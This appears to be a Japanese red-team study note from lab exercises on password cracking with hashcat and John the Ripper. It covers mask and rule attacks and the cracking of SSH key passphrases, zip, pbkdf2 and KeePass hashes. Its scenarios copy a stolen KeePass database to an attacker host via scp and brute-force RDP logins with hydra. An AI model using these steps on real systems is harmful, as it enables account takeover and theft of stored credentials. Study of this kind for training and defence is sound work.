---
title: Hash cat
parent: Password Crack
grand_parent: Red Team
nav_order: 3
---
# 01_概要

ハッシュ値の出力
```bash
echo -n "secret" | sha256sum
echo -n "secret" | sha256sum
echo -n "secret1" | sha256sum
```
- -n 改行なし
---
# 02_ベンチマークテスト
文字種と文字数からパスワードのパターン数を計算
```bash
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**5)"
# 916132832
```

現在のCPUでの解析時間
```bash
hashcat -b
# 出力例
|アルゴリズム|GPU|CPU|
|---|---|---|
|MD5|68,185.1 MH/s|450.8 MH/秒|
|SHA1|21,528.2 MH/s|298.3 MH/s|
|SHA256|9,276.3 MH/s|134.2 MH/秒|
数字の大きさは1秒あたりの計算ハッシュ数
```

計算
```bash
# 62種、8文字のパスワード
python3 -c "print(62**8)"
#　218340105584896

python3 -c "print(218340105584896 / 9276300000)"
# 23537.41314801117

python3 -c "print(62**10)"
# 839299365868340224

python3 -c "print(839299365868340224 / 9276300000)"
# 90477816.14095493
```
---

# 03_Wordlistの編集
大文字、特殊文字、数値の使用を要求するパスワードポリシーに対応する
```bash
head /usr/share/wordlists/rockyou.txt
```

```bash
mkdir passwordattacks
cd passwordattacks
head /usr/share/wordlists/rockyou.txt > demo.txt
# 10個のパスワードをコピーし、 新しく作成した**passwordattacksディレクトリ内の****demo.txt**に保存
sed -i '/^1/d' demo.txt 
# 「1」で始まるすべての行を**^1**で参照し、それらを**d**で削除し、**-iでその場で編集することで、パスワードポリシーに適合しないすべての数字列を****demo.txt**から削除

cat demo.txt
password
iloveyou
princess
rockyou
abc123
```
---

# 04_Crack

# Hashtypeの探索
## hash-identifier
```bash
hash-identifier

HASH: 4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7

Possible Hashs:
[+] SHA-384
[+] SHA-384(HMAC)
--------------------------------------------------

```

## hashid
```bash
hashid 4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7
Analyzing '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
[+] SHA-384 
[+] SHA3-384 
[+] Skein-512(384) 
[+] Skein-1024(384) 
```

## hashcat
```bash
echo -n '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC' > hash.txt

hashcat --identify hash.txt
The following 4 hash-modes match the structure of your input hash:

      # | Name                                        | Category
  ======+===================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5              | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1            | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512        | Forums, CMS, E-Commerce
```
---
# crack
```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
- -m hashtype
- -a 0 DictionaryAttack

# Show
```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
```
- --show

---

# Straight
```zsh
 hashcat -a 0 -m 1400 hash.txt rockyou.txt
```

# Combinator
- 2 wordfile
```zsh
 hashcat -a 1 -m 1400 hash.txt rockyou.txt rockyou2.txt
```

# Marker & Character Seaquence
## ?l
```
abcdefghijklmnopqrstuvwxyz
```
## ?u 
```
ABCDEFGHIJKLMNOPQRSTUVWXYZ
```
## ?d
```
0123456789
```
## ?s
```
spase!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
```

# Mask
```zsh
hashcat -m 1000 -a 3 hash.txt ?u?u?u?d?d?d?l?l?l?l?l?l?l?l?l?l?s?s?s
```
# Wordlist + Mask
```zsh
 hashcat -m 1400 -a 6 hash.txt word_mask.txt ?s?s?s
```

# Mask + Wordlist
```zsh
 hashcat -m 1400 -a 7 ?u?u?u?d?d?d hash.txt word_mask.txt
```

---

# Example

# Create Dictionary
# Create TestPassfile
```zsh
echo -n 'ABC123chocolate!!!' | sha256sum | awk '{print $1}' > hash.txt
```

![](../../assets/images/Pasted%20image%2020260508231454.png)

# Create Dictionary
```zsh
sed 's/^/ABC123/' rockyou.txt | sed 's/$/!!!/' > rockyou_hybrid.txt
```

![](../../assets/images/Pasted%20image%2020260508231500.png)

# Crack
```zsh
 hashcat -a 0 -m 1400 hash.txt rockyou_hybrid.txt
```
![](../../assets/images/Pasted%20image%2020260508231507.png)
![](../../assets/images/Pasted%20image%2020260508231512.png)

---

# SSH Private Key Passphrase

ディレクトリトラバーサルなどにより窃取した秘密鍵を使用する際に必要なパスフレーズのクラック。以下のファイルを入手済みとする。
- note.txt
- id_rsa
```bash
cat note.txt      
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```

準備
```bash
# 権限付与
chmod 600 id_rsa

ssh2john id_rsa > ssh.hash
# 出力後、最初のid_rsa:の部分を削除する

hashcat -h | grep -i "ssh"
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)        | Private Key

# note.txtの内容からルールを作成
cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

note.txtの内容のパスワードの部分を抽出したpasswordsファイルを作成しておく
cat ssh.passwords 
Window
rickc137
dave
superdave
megadave
umbrella
```

クラッキング（失敗例）
```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

# hashcatが対応していない形式
Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
```

クラッキング（成功例）
```bash
cat ssh.rules
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

# ルールファイルの内容を/etc/john/john.confに追加
sudo sh -c 'cat /home/kali/OffSec/passwordattacks/ssh.rule >> /etc/john/john.conf'

john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash

```

接続
```bash
ssh -i id_rsa -p 2222 dave@192.168.248.201
# passphraseを入力するとログインできる
```

---

# Rule

```zsh
hashcat -m 1400 -a 0 hash.txt rockyou_hybrid.txt -r /usr/share/hashcat/rules/best66.rule
```

---

# zip2

```zsh
hashcat --example-hashes | grep zip2
```
![](../../assets/images/Pasted%20image%2020260508231728.png)

```zsh
hashcat -m 13600 email.hash /usr/share/wordlists/rockyou.tx
```
![](../../assets/images/Pasted%20image%2020260508231734.png)

---

# pbkdf2

https://github.com/r0tn3x/pbkdf2-hashcat-converter
```zsh
git clone https://github.com/r0tn3x/pbkdf2-hashcat-converter.git
```
![](../../assets/images/Pasted%20image%2020260508231811.png)

```zsh
cd pbkdf2-hashcat-converter 
```

```zsh
python3 pbkdf2-to-hashcat.py 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```
![](../../assets/images/Pasted%20image%2020260508231818.png)

```zsh
echo "sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=" > hash_final.txt
```
![](../../assets/images/Pasted%20image%2020260508231826.png)

```zsh
hashcat -m 10900 hash_final.txt /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt   -w 3 -O
```
![](../../assets/images/Pasted%20image%2020260508231833.png)

---

# Sinario

## Password Manager


Password Manger
# シナリオ１
パスワードマネージャーを実行しているクライアントワークステーションへのアクセスに成功したと仮定し、パスワードマネージャーのデータベースを抽出し、ファイルをHashcatと互換性のある形式に変換し、マスターデータベースのパスワードを解読

1. RDP接続し、「アプリと機能」からKeePass（.kbdxファイル)のインストールを確認

2. ファイルのパスを確認
```Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
-  -Path C:\ ドライブ全体を検索
- -Include 検索対象とするファイルの種類を指定
- -Fileと-Recurse 引数を使ってファイルのリストを取得し、サブディレクトリも検索
- -ErrorActionをSilentlyContinueに 設定してエラーを抑制し、実行を継続

3. ファイルをkaliへ転送
```bash
 scp .\Documents\Database.kdbx kali@192.168.45.167:/home/kali/Database.kdbx
 ```

4. 解析準備
```bash
ls -la Database.kdbx
keepass2john Database.kdbx > keepass.hash
cat keepass.hash
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
# 戦闘のDatabaseの文字列がいらないので削除

hashcat --help | grep -i "KeePass"
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)  　　　　　　　       | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager

```

5. 解析
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

# シナリオ２
1.　ユーザのパスワードクラック
```bash
hydra -l nedian -P /usr/share/wordlists/rockyou.txt rdp://192.168.248.227
[3389][rdp] host: 192.168.248.227   login: nadine   password: 123abc
```

2. アプリの検索とファイル探索
![](../../assets/images/Pasted%20image%2020260508232103.png)
```Powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

3. 調査と探索
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

```zsh
keepass2john Database2.kdbx > keepass2.hash
```

```zsh
cat keepass2.hash 
Database2:$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
```

# Databaseを削除
```zsh
 vi keepass2.hash
```

```zsh
hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
